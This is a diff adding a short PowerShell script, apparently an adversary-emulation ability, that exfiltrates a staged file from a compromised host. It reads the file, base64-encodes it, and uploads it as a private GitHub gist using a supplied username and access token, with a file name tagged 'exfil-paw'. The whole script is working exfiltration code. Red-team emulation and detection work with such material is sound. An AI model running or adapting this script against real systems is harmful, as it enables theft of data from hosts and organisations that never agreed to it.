@@ -1,0 +1,20 @@
+$GHUser = "#{github.user.name}";
+$GHPAT = "#{github.access.token}";
+$File = Get-Item -Path "#{host.dir.compress}";
+$Token = $GHUser + ":" + $GHPAT;
+$EncodedToken = [System.Convert]::ToBase64String([char[]]$Token);
+
+$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-paw-$($File.name)";
+$FileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File));
+
+$StringContent = @{
+    files = @{$RemoteName = @{content = $FileContent}};
+    public = $False;
+} | ConvertTo-Json;
+$URL = "https://api.github.com/gists";
+$Body = $StringContent;
+$Headers = @{
+    "content-type" = "application/json";
+    "Authorization" = 'Basic {0}' -f $EncodedToken;
+};
+Invoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;
